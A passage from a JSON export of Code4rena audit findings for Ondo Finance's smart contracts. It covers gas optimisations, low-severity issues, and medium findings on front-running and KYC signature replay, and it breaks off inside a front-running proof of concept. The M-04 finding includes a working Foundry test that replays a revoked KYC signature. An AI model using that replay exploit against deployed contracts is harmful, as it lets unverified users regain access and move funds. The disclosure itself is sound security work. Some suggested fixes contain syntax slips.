      "content": "\nExternal calls are expensive. Consider caching the following:<br>\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L870-L960\n\n### CTokenCash.sol.liquidateBorrowFresh(): getBlockNumber() should be cached\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n870:  function liquidateBorrowFresh(\n\n889:    if (accrualBlockNumber != getBlockNumber()) { //@audit: Initial call\n890:      revert LiquidateFreshnessCheck();\n891:    }\n\n894:    if (cTokenCollateral.accrualBlockNumber() != getBlockNumber()) {//@audit: 2nd call\n895:      revert LiquidateCollateralFreshnessCheck();\n896:    }\n```\n\n```diff\ndiff --git a/contracts/lending/tokens/cCash/CTokenCash.sol b/contracts/lending/tokens/cCash/CTokenCash.sol\nindex 93d5000..5e6fc1f 100644\n--- a/contracts/lending/tokens/cCash/CTokenCash.sol\n+++ b/contracts/lending/tokens/cCash/CTokenCash.sol\n@@ -886,12 +886,13 @@ abstract contract CTokenCash is\n     }\n\n     /* Verify market's block number equals current block number */\n-    if (accrualBlockNumber != getBlockNumber()) {\n+    uint _getBlockNumber = getBlockNumber();\n+    if (accrualBlockNumber != _getBlockNumber) {\n       revert LiquidateFreshnessCheck();\n     }\n\n     /* Verify cTokenCollateral market's block number equals current block number */\n-    if (cTokenCollateral.accrualBlockNumber() != getBlockNumber()) {\n+    if (cTokenCollateral.accrualBlockNumber() != _getBlockNumber) {\n       revert LiquidateCollateralFreshnessCheck();\n     }\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CTokenModified.sol#L870-L960\n\n### CTokenModified.sol.liquidateBorrowFresh(): getBlockNumber() should be cached\n```solidity\nFile: /contracts/lending/tokens/cToken/CTokenModified.sol\n870:  function liquidateBorrowFresh(\n\n889:    if (accrualBlockNumber != getBlockNumber()) { //@audit: Initial call\n890:      revert LiquidateFreshnessCheck();\n891:    }\n\n894:    if (cTokenCollateral.accrualBlockNumber() != getBlockNumber()) {//@audit: 2nd call\n895:      revert LiquidateCollateralFreshnessCheck();\n896:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-04-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "6424",
      "title": "[G-03] Massive 15k per tx gas savings - use 1 and 2 for Reentrancy guard",
      "impact": "GAS",
      "content": "Using `true` and `false` will trigger gas-refunds, which after London are 1/5 of what they used to be, meaning using `1` and `2` (keeping the slot non-zero), will cost 5k per change (5k + 5k) vs 20k + 5k, saving you 15k gas per function which uses the modifier.\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L1434-L1439\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n  modifier nonReentrant() {\n    require(_notEntered, \"re-entered\");\n    _notEntered = false;\n    _;\n    _notEntered = true; // get a gas-refund post-Istanbul\n  }\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CTokenModified.sol#L1437-L1442\n```solidity\nFile: /contracts/lending/tokens/cToken/CTokenModified.sol\n  modifier nonReentrant() {\n    require(_notEntered, \"re-entered\");\n    _notEntered = false;\n    _;\n    _notEntered = true; // get a gas-refund post-Istanbul\n  }\n```\n\n[See solmate implementation](https://github.com/transmissions11/solmate/blob/main/src/utils/ReentrancyGuard.sol)\n\nWe could debate about the above finding being on the c4udit as **using bools** but due to the huge impact it would have, I've highlighted it here. Feel free to not include it when doing gas savings calculations. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-03-massive-15k-per-tx-gas-savings---use-1-and-2-for-reentrancy-guard",
      "tags": [],
      "finders": []
    },
    {
      "id": "6423",
      "title": "[G-02] Tightly pack storage variables/optimize the order of variable declaration (Gas Savings: 6k in total)",
      "impact": "GAS",
      "content": "\nHere, the storage variables can be tightly packed to save some slots<br>\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenInterfacesModifiedCash.sol#L13-L48\n\n### \\_notEnteredand  admin can be packed together (Saves 1 SLOT) `Gas savings: 1 * 2k = 2k`\n\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenInterfacesModifiedCash.sol\n\n//@audit:   bool internal _notEntered, uint8 public decimals and  address payable public admin can be packed together\ncontract CTokenStorage {\n  bool internal _notEntered;\n  string public name;\n  string public symbol;\n  uint8 public decimals;\n  uint internal constant borrowRateMaxMantissa = 0.0005e16;\n  uint internal constant reserveFactorMaxMantissa = 1e18;\n  address payable public admin;\n  address payable public pendingAdmin;\n```\n\n```diff\ndiff --git a/contracts/lending/tokens/cCash/CTokenInterfacesModifiedCash.sol b/contracts/lending/tokens/cCash/CTokenInterfacesModifiedCash.sol\nindex dd722f4..0ce7402 100644\n--- a/contracts/lending/tokens/cCash/CTokenInterfacesModifiedCash.sol\n+++ b/contracts/lending/tokens/cCash/CTokenInterfacesModifiedCash.sol\n@@ -16,6 +16,19 @@ contract CTokenStorage {\n    */\n   bool internal _notEntered;\n\n+  uint8 public decimals;\n+  address payable public admin;\n+  address payable public pendingAdmin;\n   string public symbol;\n-  uint8 public decimals;\n   uint internal constant borrowRateMaxMantissa = 0.0005e16;\n   uint internal constant borrowRateMaxMantissa = 0.0005e16;\n   uint internal constant reserveFactorMaxMantissa = 1e18;\n-  address payable public admin;\n-  address payable public pendingAdmin;\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CTokenInterfacesModified.sol#L15-L41\n\n### \\_notEntered and admin can be packed together (Saves 1 SLOT) `Gas savings: 1 * 2k = 2k`\n\n```solidity\nFile: /contracts/lending/tokens/cToken/CTokenInterfacesModified.sol\n  bool internal _notEntered;\n  string public name;\n  string public symbol;\n  uint8 public decimals;\n  uint internal constant borrowRateMaxMantissa = 0.0005e16;\n  uint internal constant reserveFactorMaxMantissa = 1e18;\n  address payable public admin;\n```\n\n```diff\ndiff --git a/contracts/lending/tokens/cToken/CTokenInterfacesModified.sol b/contracts/lending/tokens/cToken/CTokenInterfacesModified.sol\nindex afffb0f..58af08d 100644\n--- a/contracts/lending/tokens/cToken/CTokenInterfacesModified.sol\n+++ b/contracts/lending/tokens/cToken/CTokenInterfacesModified.sol\n@@ -13,7 +13,19 @@ contract CTokenStorage {\n    * @dev Guard variable for re-entrancy checks\n    */\n   bool internal _notEntered;\n+  uint8 public decimals;\n+  address payable public admin;\n+  address payable public pendingAdmin;\n   string public symbol;\n-  uint8 public decimals;\n   uint internal constant borrowRateMaxMantissa = 0.0005e16;\n   uint internal constant reserveFactorMaxMantissa = 1e18;\n-  address payable public admin;\n-  address payable public pendingAdmin;\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cErc20ModifiedDelegator.sol#L187-L218\n\n### \\_notEntered can be packed with an address variable(saves 1 SLOT) `Gas savings: 1 * 2k = 2k`\n```solidity\nFile: /contracts/lending/tokens/cErc20ModifiedDelegator.sol\n\n//@audit: bool internal _notEntered should be packed with address payable public admin\n  bool internal _notEntered;\n  string public name;\n  string public symbol;\n  uint8 public decimals;\n  uint256 internal constant borrowRateMaxMantissa = 0.0005e16;\n  uint256 internal constant reserveFactorMaxMantissa = 1e18;\n  address payable public admin;\n```\n\n```diff\ndiff --git a/contracts/lending/tokens/cErc20ModifiedDelegator.sol b/contracts/lending/tokens/cErc20ModifiedDelegator.sol\nindex c1e9170..ca1ae31 100644\n--- a/contracts/lending/tokens/cErc20ModifiedDelegator.sol\n+++ b/contracts/lending/tokens/cErc20ModifiedDelegator.sol\n\n   bool internal _notEntered;\n+  uint8 public decimals;\n+  address payable public admin;\n+  address payable public pendingAdmin;\n   string public symbol;\n-  uint8 public decimals;\n   uint256 internal constant reserveFactorMaxMantissa = 1e18;\n-  address payable public admin;\n-  address payable public pendingAdmin;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-02-tightly-pack-storage-variablesoptimize-the-order-of-variable-declaration-gas-savings-6k-in-total",
      "tags": [],
      "finders": []
    },
    {
      "id": "6422",
      "title": "[G-01] Using immutable on variables that are only set in the constructor and never after (2.1k gas per var)",
      "impact": "GAS",
      "content": "Use immutable if you want to assign a permanent value at construction. Use constants if you already know the permanent value. Both get directly embedded in bytecode, saving SLOAD.<br>\nVariables only set in the constructor and never edited afterwards should be marked as immutable, as it would avoid the expensive storage-writing operation in the constructor (around 20 000 gas per variable) and replace the expensive storage-reading operations (around 2100 gas per reading) to a less expensive value reading (3 gas).\n\n**Total instaces: 1 `gas savings 1 * 2.1k = 2.1k gas`**\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/JumpRateModelV2.sol#L24\n```solidity\nFile: /contracts/lending/JumpRateModelV2.sol\n24:  address public owner;\n```\n\n```diff\ndiff --git a/contracts/lending/JumpRateModelV2.sol b/contracts/lending/JumpRateModelV2.sol\nindex a3971c6..d4f2285 100644\n--- a/contracts/lending/JumpRateModelV2.sol\n+++ b/contracts/lending/JumpRateModelV2.sol\n@@ -21,7 +21,7 @@ contract JumpRateModelV2 is InterestRateModel {\n   /**\n    * @notice The address of the owner, i.e. the Timelock contract, which can update parameters directly\n    */\n-  address public owner;\n+  address public immutable owner;\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-01-using-immutable-on-variables-that-are-only-set-in-the-constructor-and-never-after-21k-gas-per-var",
      "tags": [],
      "finders": []
    },
    {
      "id": "6421",
      "title": "[L-05] `completeRedemptions` is vulnerable to admin mistakes",
      "impact": "LOW",
      "content": "The function `completeRedemptions` allows an admin account to distribute collateral to users.<br>\nThe problem is that the collateral calculation is based on the inputed spec `collateralAmountToDist`.<br>\nDuo to that a single admin mistake is not allowed, as it can lead to users receiving less funds back or in the worst case receiving nothing and the collateral being stuck in the assetSender contract.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n707:  function completeRedemptions(\n708:    address[] calldata redeemers,\n709:    address[] calldata refundees,\n710:    uint256 collateralAmountToDist,\n711:    uint256 epochToService,\n712:    uint256 fees\n713;  ) external override updateEpoch onlyRole(MANAGER_ADMIN) {\n714:    _checkAddressesKYC(redeemers);\n715:    _checkAddressesKYC(refundees);\n716:    if (epochToService >= currentEpoch) {\n717:      revert MustServicePastEpoch();\n718:    }\n719:    // Calculate the total quantity of shares tokens burned w/n an epoch\n720:    uint256 refundedAmt = _processRefund(refundees, epochToService);\n721:    uint256 quantityBurned = redemptionInfoPerEpoch[epochToService]\n722:      .totalBurned - refundedAmt;\n723:    uint256 amountToDist = collateralAmountToDist - fees;\n724:    _processRedemption(redeemers, amountToDist, quantityBurned, epochToService);\n725:    collateral.safeTransferFrom(assetSender, feeRecipient, fees);\n726:    emit RedemptionFeesCollected(feeRecipient, fees, epochToService);\n727:  }\n```\n```solidity\n743:  function _processRedemption\n755:  uint256 collateralAmountDue = (amountToDist * cashAmountReturned) /\n756:        quantityBurned;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#l-05-completeredemptions-is-vulnerable-to-admin-mistakes",
      "tags": [],
      "finders": []
    },
    {
      "id": "6420",
      "title": "[L-04] Redeem limit shouldn't be set below the `currentMintAmount`",
      "impact": "LOW",
      "content": "The function `setRedeemLimit` is used by the admin to update the amount of token that can be redeemed during one epoch.<br>\nA check should be made to ensure the new redeem limit isn't set below the `currentMintAmount`.<br>\nAs this problem will lead to the users not being able to request redeem their minted amount of cash on the current epoch.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n// Before\n609:  function setRedeemLimit(\n610:    uint256 _redeemLimit\n612:  ) external onlyRole(MANAGER_ADMIN) {\n613:    uint256 oldRedeemLimit = redeemLimit;\n614:    redeemLimit = _redeemLimit;\n615:    emit RedeemLimitSet(oldRedeemLimit, _redeemLimit);\n616:  }\n\n// After \n609:  function setRedeemLimit(\n610:    uint256 _redeemLimit\n612:  ) external onlyRole(MANAGER_ADMIN) {\n613:    require(_redeemLimit > currentMintAmount, \"RedeemLimit below the currentMintAmount\")\n614:    uint256 oldRedeemLimit = redeemLimit;\n615:    redeemLimit = _redeemLimit;\n616:    emit RedeemLimitSet(oldRedeemLimit, _redeemLimit);\n617:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#l-04-redeem-limit-shouldnt-be-set-below-the-currentmintamount",
      "tags": [],
      "finders": []
    },
    {
      "id": "6419",
      "title": "[L-03] Giving KYC status to address(0) should be forbidden",
      "impact": "LOW",
      "content": "The function `addKYCAddressViaSignature` in KYCRegistry.sol is restricted to the KYC requirement group, which is allowed to give KYC status to user's addresses. Considering the KYC status is checked all over the protocol and if KYCed the zero address can be used. A check should be made in the function `addKYCAddressViaSignature` to make sure\nthe KYC status isn't given to the zero address.\n\nAdd this check to the function `addKYCAddressViaSignature`:\n```solidity\nrequire(user != address(0), \"KYC status for address(0) not allowed\")\n```\n\n```solidity\n79:  function addKYCAddressViaSignature(\n80:    uint256 kycRequirementGroup,\n81:    address user,\n82:    uint256 deadline,\n83:    uint8 v,\n84:    bytes32 r,\n85:    bytes32 s\n86:  ) external {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#l-03-giving-kyc-status-to-address0-should-be-forbidden",
      "tags": [],
      "finders": []
    },
    {
      "id": "6418",
      "title": "[L-02] Wrong if statement in the function `setMintFee`",
      "impact": "LOW",
      "content": "The function `setMintFee` in CashManager.sol is used by the admin to change the mint fee.<br>\nBy the dev comment above the function, the maximum fee that can be set is `10_000` bps, or 100%.<br>\nAs the value of the BPS_DENOMINATOR is set as `10_000` and can't be changed.<br>\nThe if statement in the function is wrong as it doesn't allow to be set as the maximum fee `10_000` bps.<br>\n`if (_mintFee >= BPS_DENOMINATOR)` should be changed to `if (_mintFee > BPS_DENOMINATOR)`.\n\n```solidity\n408:  // * @dev The maximum fee that can be set is 10_000 bps, or 100%\n```\n\n```solidity\ncontracts/cash/CashManager.sol\n\n410:  function setMintFee(\n411:    uint256 _mintFee\n412:  ) external override onlyRole(MANAGER_ADMIN) {\n413:    if (_mintFee >= BPS_DENOMINATOR) {\n414:      revert MintFeeTooLarge();\n415    }\n416:    uint256 oldMintFee = mintFee;\n417:   mintFee = _mintFee;\n418:    emit MintFeeSet(oldMintFee, _mintFee);\n419:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#l-02-wrong-if-statement-in-the-function-setmintfee",
      "tags": [],
      "finders": []
    },
    {
      "id": "6417",
      "title": "[L-01] Token transfer to address(0) should be avoided",
      "impact": "LOW",
      "content": "The internal function `_beforeTokenTransfer` ignores the use of address(0).<br>\nAs how it is now the two if statements won't be triggered on address(0) and the function will finish successfully.\n\n```solidity\n56:  function _beforeTokenTransfer(\n57:    address from,\n58:    address to,\n59:    uint256 amount\n60:  ) internal override {\n61:    super._beforeTokenTransfer(from, to, amount);\n62:\n63:    require(\n64:      _getKYCStatus(_msgSender()),\n65:      \"CashKYCSenderReceiver: must be KYC'd to initiate transfer\"\n66:    );\n67:\n68:    if (from != address(0)) {\n69:      // Only check KYC if not minting\n70:      require(\n71:        _getKYCStatus(from),\n72:        \"CashKYCSenderReceiver: `from` address must be KYC'd to send tokens\"\n73:      );\n74:    }\n75:\n76:    if (to != address(0)) {\n77:      // Only check KYC if not burning\n78:      require(\n79:        _getKYCStatus(to),\n80:        \"CashKYCSenderReceiver: `to` address must be KYC'd to receive tokens\"\n81:      );\n82:    }\n83:  }\n84: }\n```\n\nConsider applying a check, which will revert if the \"from\" or \"to\" address are set as the zero address and remove \nthe two if statements:\n\n```solidity\n56:  function _beforeTokenTransfer(\n57:    address from,\n58:    address to,\n59:    uint256 amount\n60:  ) internal override {\n61:    super._beforeTokenTransfer(from, to, amount);\n62:    \n63:    require(from != address(0), \"\")\n64:    require(to != address(0), \"\")\n65\n66:    require(\n67:      _getKYCStatus(_msgSender()),\n68:      \"CashKYCSenderReceiver: must be KYC'd to initiate transfer\"\n69:    );\n70:\n71:      // Only check KYC if not minting\n72:      require(\n73:        _getKYCStatus(from),\n74:        \"CashKYCSenderReceiver: `from` address must be KYC'd to send tokens\"\n75:      );\n76:\n77:      // Only check KYC if not burning\n78:      require(\n79:        _getKYCStatus(to),\n80:        \"CashKYCSenderReceiver: `to` address must be KYC'd to receive tokens\"\n81:      );\n83:  }\n84: }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#l-01-token-transfer-to-address0-should-be-avoided",
      "tags": [],
      "finders": []
    },
    {
      "id": "6416",
      "title": "[M-05] `setPendingRedemptionBalance()` may cause the user's cash token to be lost",
      "impact": "MEDIUM",
      "content": "\n`setPendingRedemptionBalance()` are not checking Old balances, resulting in the possibility of overwriting the new balance added by the user.\n\n### Proof of Concept\n\nIn `setPendingRedemptionBalance()`, `MANAGER_ADMIN` can adjust the amount of the cash token of user to be burned  in some cases: addressToBurnAmt\\[user]\nThree main parameters are passed in.\n\n```solidity\n    address user,\n    uint256 epoch,\n    uint256 balance\n```\n\nBefore modification will check epoch can not be greater than the currentEpoch, is can modify the currentEpoch user balance.\n\nThis has a problem:<br>\nThe user is able to increase the addressToBurnAmt\\[user]  of currentEpoch by `requestRedemption()`<br>\nThis leaves open the possibility that the user may have unknowingly executed requestRedemption() before settingPendingRedemptionBalance(), causing the increased balance to be overwritten<br>\n\nFor example:<br>\ncurrentEpoch = 1<br>\nBalance of alice: addressToBurnAmt\\[alice] = 50\n\n1.  The administrator finds something wrong, there is 10 less, so he wants to increase it by 10, so he calls setPendingRedemptionBalance (balance=60)\n2.  Alice does not know the above operation and wants to increase the redemption by 100, so it executes requestRedemption(100), which is executed earlier than setPendingRedemptionBalance() because the gas price is set higher\n3.  The result is that the final balance of alice becomes only 60. change process: `50 => 150 => 60`\n\nThe result is missing 100.\n\nSuggest adding oldBalance, not equal will revert.\n\n### Recommended Mitigation Steps\n\nAdding oldBalance, not equal will revert.\n\n```solidity\n  function setPendingRedemptionBalance(\n    address user,\n    uint256 epoch,\n+   uint256 oldBalance    \n    uint256 balance\n  ) external updateEpoch onlyRole(MANAGER_ADMIN) {\n    if (epoch > currentEpoch) {\n      revert CannotServiceFutureEpoch();\n    }\n+   require(oldBalance == redemptionInfoPerEpoch[epoch].addressToBurnAmt[user],\"bad old balance\");\n\n```\n\n**[ali2251 (Ondo Finance) confirmed via duplicate issue `#141`](https://github.com/code-423n4/2023-01-ondo-findings/issues/141#issuecomment-1410648941)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the setPendingRedemptionBalance() function in the CashManager.sol file which could result in the overwriting of new balance added by the user. The function takes three parameters: address user, uint256 epoch, and uint256 balance. The issue is that before modification, the function does not check the old balance of the user and so if the user unknowingly executes the requestRedemption() function before setPendingRedemptionBalance(), the increased balance could be overwritten. \n\nThe recommended mitigation step for this vulnerability is to add an oldBalance parameter to the setPendingRedemptionBalance() function, and to check that the oldBalance is equal to the redemptionInfoPerEpoch[epoch].addressToBurnAmt[user] before making any changes. If the oldBalance is not equal, the function should revert.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "https://github.com/code-423n4/2023-01-ondo-findings/issues/82",
      "tags": [],
      "finders": [
        "bin2chen",
        "chaduke"
      ]
    },
    {
      "id": "6415",
      "title": "[M-04] KYCRegistry is susceptible to signature replay attack.",
      "impact": "MEDIUM",
      "content": "\nThe KYCRegistry contract uses signatures to grant KYC status to the users using the `addKYCAddressViaSignature` function.\n\nHowever this function does not prevent replaying of signatures in the case where KYC status was revoked from a user.\n\n```solidity\n  function addKYCAddressViaSignature( ... ) external {\n    require(v == 27 || v == 28, \"KYCRegistry: invalid v value in signature\");\n    require(\n      !kycState[kycRequirementGroup][user],\n      \"KYCRegistry: user already verified\"\n    );\n    require(block.timestamp <= deadline, \"KYCRegistry: signature expired\");\n    bytes32 structHash = keccak256(\n      abi.encode(_APPROVAL_TYPEHASH, kycRequirementGroup, user, deadline)\n    );\n\n    bytes32 expectedMessage = _hashTypedDataV4(structHash);\n\n    address signer = ECDSA.recover(expectedMessage, v, r, s);\n    _checkRole(kycGroupRoles[kycRequirementGroup], signer);\n\n    kycState[kycRequirementGroup][user] = true;\n    // ...\n  }\n```\n\nThis function could be exploited in the case when these conditions are true:\n\n*   KYC status was granted to user using a signature with validity up to `deadline`.\n*   Before the `deadline` was passed, the KYC status of user was revoked using the `removeKYCAddresses` function.\n\nIn the abovementioned conditions, the malicious user can submit the original signature again to the `addKYCAddressViaSignature` function which will forcefully grant the KYC status to the malicious user again.\n\nIt should also be noted that due to this bug until the deadline has passed, the privileged accounts cannot revoke the KYC status of a KYC granted user. This can result in unwanted moving of funds by the user in/out of Ondo protocol.\n\n### Proof of Concept\n\nTest file created `BugTest.t.sol` and was run by ` forge test --mp ./forge-tests/BugTest1.t.sol  `\n\n```solidity\npragma solidity 0.8.16;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/Vm.sol\";\n\nimport \"contracts/cash/kyc/KYCRegistry.sol\";\n\ncontract SanctionsList {\n    function isSanctioned(address) external pure returns (bool) {\n        return false;\n    }\n}\nstruct KYCApproval {\n    uint256 kycRequirementGroup;\n    address user;\n    uint256 deadline;\n}\n\ncontract BugTest1 is Test {\n    bytes32 APPROVAL_TYPEHASH;\n    bytes32 DOMAIN_SEPARATOR;\n    KYCRegistry registry;\n\n    address admin;\n    address kycAgent;\n    uint256 kycAgentPrivateKey = 0xB0B;\n    address attacker;\n\n    function setUp() public {\n        admin = address(0xad);\n        attacker = address(0xbabe);\n        kycAgent = vm.addr(kycAgentPrivateKey);\n        registry = new KYCRegistry(admin, address(new SanctionsList()));\n        APPROVAL_TYPEHASH = registry._APPROVAL_TYPEHASH();\n        DOMAIN_SEPARATOR = registry.DOMAIN_SEPARATOR();\n    }\n\n    function test_bug() public {\n        uint256 kycGroup = 1;\n        bytes32 kycGroupRole = \"0x01\";\n        vm.prank(admin);\n        registry.assignRoletoKYCGroup(kycGroup, kycGroupRole);\n        vm.prank(admin);\n        registry.grantRole(kycGroupRole, kycAgent);\n        vm.stopPrank();\n\n        uint256 deadline = block.timestamp + 1 days;\n        KYCApproval memory approval = KYCApproval({\n            kycRequirementGroup: kycGroup,\n            user: attacker,\n            deadline: deadline\n        });\n        bytes32 digest = getTypedDataHash(approval);\n        // KYC approval got signed with validity of 1 day\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(kycAgentPrivateKey, digest);\n\n        assertEq(registry.kycState(kycGroup, attacker), false);\n        assertEq(registry.getKYCStatus(kycGroup, attacker), false);\n\n        vm.prank(attacker);\n        registry.addKYCAddressViaSignature(kycGroup, attacker, deadline, v, r, s);\n\n        assertEq(registry.kycState(kycGroup, attacker), true);\n        assertEq(registry.getKYCStatus(kycGroup, attacker), true);\n\n        address[] memory toBeRemovedAddrs = new address[](1);\n        toBeRemovedAddrs[0] = attacker;\n        // KYC approval was removed\n        vm.prank(kycAgent);\n        registry.removeKYCAddresses(kycGroup, toBeRemovedAddrs);\n        vm.stopPrank();\n        assertEq(registry.getKYCStatus(kycGroup, attacker), false);\n\n        // KYC approval was granted again by replaying the original signature\n        vm.prank(attacker);\n        registry.addKYCAddressViaSignature(kycGroup, attacker, deadline, v, r, s);\n        assertEq(registry.kycState(kycGroup, attacker), true);\n        assertEq(registry.getKYCStatus(kycGroup, attacker), true);\n    }\n\n    function getStructHash(KYCApproval memory _approval) internal view returns (bytes32) {\n        return keccak256(abi.encode(APPROVAL_TYPEHASH, _approval.kycRequirementGroup, _approval.user, _approval.deadline));\n    }\n\n    function getTypedDataHash(KYCApproval memory _approval) public view returns (bytes32) {\n        return keccak256(abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR, getStructHash(_approval)));\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nA nonce mapping for message signers can be maintained; the value of which can be incremented for every successful signature validation.\n\n```solidity\nmapping(address => uint) private nonces;\n```\n\nA more detailed usage example can be found in OpenZeppelin's EIP-2612 implementation. \n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Permit.sol#L90>\n\n**[ali2251 (Ondo Finance) disagreed with severity and commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/187#issuecomment-1410643360):**\n > Timestamps prevent replay attacks. These timestamps are like 30 minutes long, so the attack is valid only within 30 minutes and we can change the timestamp to 5 minutes and then it becomes exteremely hard for this attack to happen. Within 5 minutes, a suer must add themselves, then Admin removed them, then they add themselves but once 5 minutes is over, the attacker can no longer add themselves and so the admin can just remove them after 5 minutes. It can be seen here that in tests we use 9 minutes: https://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/forge-tests/cash/registry/RegistrySignature.t.sol#L57\n\n**[Trust (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-ondo-findings/issues/187)**\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the KYCRegistry contract which uses signatures to grant KYC status to users. This bug can be exploited in the case where KYC status was granted to a user using a signature with validity up to a certain deadline and before the deadline was passed, the KYC status of the user was revoked using the `removeKYCAddresses` function. In this case, a malicious user can submit the original signature again to the `addKYCAddressViaSignature` function which will forcefully grant the KYC status to the malicious user again. This bug can also result in privileged accounts not being able to revoke the KYC status of a KYC granted user until the deadline has passed, leading to unwanted movement of funds by the user in/out of Ondo protocol.\n\nThe bug was tested using a test file called `BugTest.t.sol` which was run by `forge test --mp ./forge-tests/BugTest1.t.sol`. The test was successful in replicating the bug.\n\nRecommended mitigation steps for this bug include maintaining a nonce mapping for message signers which can be incremented for every successful signature validation. A more detailed usage example can be found in OpenZeppelin's EIP-2612 implementation.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "https://github.com/code-423n4/2023-01-ondo-findings/issues/187",
      "tags": [
        "Replay Attack"
      ],
      "finders": [
        "csanuragjain",
        "Bauer",
        "rbserver",
        "immeas",
        "Tajobin",
        "gzeon",
        "0xjuicer",
        "adriro",
        "AkshaySrivastav"
      ]
    },
    {
      "id": "6414",
      "title": "[M-03] `CashManager.setEpochDuration` functions has inconsistent output",
      "impact": "MEDIUM",
      "content": "\nThe CashManager contract contains `setEpochDuration` function which is used by `MANAGER_ADMIN` role to update the `epochDuration` parameter.\n\n```solidity\n  function setEpochDuration(uint256 _epochDuration) external onlyRole(MANAGER_ADMIN) {\n    uint256 oldEpochDuration = epochDuration;\n    epochDuration = _epochDuration;\n    emit EpochDurationSet(oldEpochDuration, _epochDuration);\n  }\n```\n\nThe result of the `setEpochDuration` function execution can be impacted any external agent. The `epochDuration` is a crucial parameter of CashManager contract which determines the length of epochs in the contract.\n\nThe issue here is that the `setEpochDuration` function updates the `epochDuration` value without invoking the `transitionEpoch` function first. \n\nThis leads to two different end results and scenarios:\n\n1.  When `transitionEpoch` is executed before `setEpochDuration` by an external agent (front-running).\n2.  When `transitionEpoch` is executed after `setEpochDuration` by an external agent (back-running).\n\nIn these two different cases, the duration and epoch number of last few passed epochs can be impacted differently. The result becomes dependent upon the wish of the external agent.\n\nThe exact impact is demonstrated in the PoC below.\n\n### Proof of Concept\n\nNew test cases were added to `forge-tests/cash/cash_manager/Setters.t.sol` file.\n\n```solidity\n  function test_bug_inconsistentOutputOf_setEpochDuration_Case1() public {\n    // skip 1 epoch duration\n    vm.warp(block.timestamp + 1 days);\n\n    // here the setEpochDuration() txn is frontrunned by issuing the transitionEpoch() txn\n    cashManager.transitionEpoch();\n    // this is the setEpochDuration() txn which was frontrunned\n    